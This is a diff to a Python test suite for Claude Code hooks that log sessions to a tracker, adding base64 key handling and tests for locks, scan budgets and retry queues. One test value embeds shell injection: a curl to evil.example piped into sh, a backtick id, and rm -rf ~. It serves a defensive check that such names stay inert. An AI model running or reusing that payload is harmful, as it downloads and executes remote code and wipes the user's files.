@@ -106,8 +106,12 @@ def state():
 
 
 def key_in(text):
-    m = re.search(r'--key "([^"]+)"', text)
-    return m.group(1) if m else None
+    m = re.search(r"--key-b64 ([A-Za-z0-9_-]+)", text)
+    if not m:
+        return None
+    import base64
+    tok = m.group(1)
+    return base64.urlsafe_b64decode(tok + "=" * (-len(tok) % 4)).decode("utf-8")
 
 
 print("quiet until a session has done real work")
@@ -312,8 +316,9 @@ print("\nnames from the tracker can't run as commands when Claude copies a line"
 evil = 'Idea$(curl -s evil.example | sh)`id`"; rm -rf ~'
 quoted = core._q(evil)
 check("no $, backtick or stray quote survives", not any(c in quoted[1:-1] for c in '$`"\\'), quoted)
-line = core.command("accept", "s", "git:github.com/x/y", "--claim", quoted)
+line = core.command("accept", "s", "git:github.com/x/y", "--claim-b64", core.b64e(evil))
 check("so the copied command carries it as plain text", "$(" not in line and "`" not in line, line)
+check("and the encoded value comes back exactly", core.b64d(core.b64e(evil)) == evil)
 import importlib.util  # noqa: E402
 spec = importlib.util.spec_from_file_location("log_it", HOOKS / "log-it.py")
 log_it = importlib.util.module_from_spec(spec)
@@ -324,6 +329,104 @@ lines, claim = log_it.offer_text("KB", "A knowledge base", [], [
 check("a parked idea becomes the claim, worded as good news", claim == evil and any("Good news" in l for l in lines))
 check("a live match is an offer to coordinate, never a wall",
       any("we-might-overlap note" in l and "Your call" in l for l in lines))
+
+print("\nexact names and keys survive the copy, whatever they contain")
+odd = TMP / "proj $HOME `x` \"q\""
+odd.mkdir()
+tp13 = TMP / "s13.jsonl"
+transcript(tp13, prompts=3, changes=6)
+out = hook("UserPromptSubmit", "s13", odd, tp13)[0].stdout
+k13 = key_in(out)
+check("a folder with shell characters is keyed exactly", k13 == "dir:" + odd.resolve().as_posix(), repr(k13))
+token = re.search(r"--key-b64 ([A-Za-z0-9_-]+)", out).group(1)
+helper("decline", "--session", "s13", "--key-b64", token, "--name-b64", core.b64e("Budget $ Forecast"),
+       "--note", "mine")
+names = state()["builds"][k13]["names"]
+check("the answer lands on that exact key and name", names.get("Budget $ Forecast", {}).get("outcome") == "declined",
+      repr(names))
+
+print("\nan answer from a skill (no session given) resolves the open checkpoint")
+repo14 = make_repo("skill-path", "https://github.com/someone/skill-path.git")
+tp14 = TMP / "s14.jsonl"
+transcript(tp14, prompts=3, changes=6)
+out = hook("UserPromptSubmit", "s14", repo14, tp14)[0].stdout
+check("the checkpoint asked", "exploration log checkpoint" in out)
+helper("not-yet", "--reason", "builder asked something else", cwd=repo14)
+check("an answer with no --session closes that session's question",
+      state()["sessions"]["s14"]["answer"] == "not-yet", repr(state()["sessions"]["s14"]))
+check("so the stop sends no reminder", hook("Stop", "s14", repo14, tp14)[0].stdout.strip() == "")
+
+print("\none record bigger than the read budget is stepped over, not reread forever")
+huge = TMP / "huge.jsonl"
+transcript(huge, prompts=1, changes=0)
+with open(huge, "a", encoding="utf-8") as fh:
+    fh.write(json.dumps({"type": "user", "message": {"content": [{"type": "tool_result",
+             "content": "z" * (core.SCAN_BUDGET_BYTES + 1000)}]}}) + "\n")
+transcript(huge, prompts=0, changes=3, mode="a")
+with open(huge, "a", encoding="utf-8") as fh:
+    for _ in range(3):
+        fh.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Write",
+                 "input": {}}]}}) + "\n")
+sess = {"offset": 0, "changes": 0, "prompts": 0}
+for _ in range(6):
+    core.scan(sess, huge)
+check("the edits after it are counted", sess["changes"] == 3, repr(sess))
+
+print("\nthe lock never holds up a prompt for long, flock or not")
+if not WINDOWS:
+    holder = subprocess.Popen([sys.executable, "-c", (
+        "import fcntl,sys,time,os; sys.path.insert(0, sys.argv[1]); import logit_core as c; "
+        "p=c.state_path().with_suffix('.lock'); p.parent.mkdir(parents=True, exist_ok=True); "
+        "f=open(p,'w'); fcntl.flock(f, fcntl.LOCK_EX); print('held', flush=True); time.sleep(8)"), str(HOOKS)],
+        stdout=subprocess.PIPE, text=True, encoding="utf-8", errors="replace", env=ENV)
+    holder.stdout.readline()
+    t0 = time.monotonic()
+    r, _ = hook("UserPromptSubmit", "s15", repo, TMP / "s1.jsonl")
+    waited = time.monotonic() - t0
+    holder.kill()
+    check(f"a held flock is given up after the wait ({waited:.1f}s)", waited < 7 and r.returncode == 0)
+
+print("\nqueued logs are kept until the tracker takes them, and reopened if it refuses")
+import http.server, threading  # noqa: E401,E402
+class Refuse(http.server.BaseHTTPRequestHandler):
+    def do_POST(self):
+        self.rfile.read(int(self.headers.get("Content-Length") or 0))
+        self.send_response(404); self.send_header("Content-Type", "application/json"); self.end_headers()
+        self.wfile.write(b'{"error": "No builder found for test.builder@nsls.org"}')
+    def log_message(self, *a):
+        pass
+srv = http.server.HTTPServer(("127.0.0.1", 0), Refuse)
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+repo16 = make_repo("queue-probe", "https://github.com/thensls/queue-probe.git")
+key16 = "git:github.com/thensls/queue-probe"
+helper("accept", "--session", "s16", "--key", key16, "--name", "Queue probe", "--sentence", "Probes the queue",
+       cwd=repo16)
+q0 = state()["pending"]
+check("a log the tracker didn't take is queued", len(q0) == 1 and q0[0]["name"] == "Queue probe", repr(q0))
+data = state()
+data["pending"][0]["created"] = "2000-01-01T00:00:00Z"   # far older than any age limit
+STATE.write_text(json.dumps(data), encoding="utf-8")
+helper("retry-pending")
+check("it is never dropped for age", len(state()["pending"]) == 1)
+data = state()
+data["pending"][0]["next_try"] = "2000-01-01T00:00:00Z"
+STATE.write_text(json.dumps(data), encoding="utf-8")
+helper("retry-pending")
+q1 = state()["pending"]
+check("a retry that can't reach the tracker keeps it, with a later next try",
+      len(q1) == 1 and q1[0]["attempts"] >= 2 and q1[0]["next_try"] > core.now_iso(), repr(q1))
+data = state()
+data["pending"][0]["next_try"] = "2000-01-01T00:00:00Z"
+STATE.write_text(json.dumps(data), encoding="utf-8")
+ENV_SAVED = ENV["NSLS_TRACKER_URL"]
+ENV["NSLS_TRACKER_URL"] = f"http://127.0.0.1:{srv.server_address[1]}"
+helper("retry-pending")
+ENV["NSLS_TRACKER_URL"] = ENV_SAVED
+srv.shutdown()
+st = state()
+check("a refusal takes it off the queue", st["pending"] == [], repr(st["pending"]))
+check("and reopens the build so it can be offered again",
+      st["builds"][key16]["names"]["Queue probe"]["outcome"] == "offered", repr(st["builds"][key16]))
 
 print("\nthe labels it reports exist in the emitter, and hooks.json registers it")
 import guardrail_emit  # noqa: E402
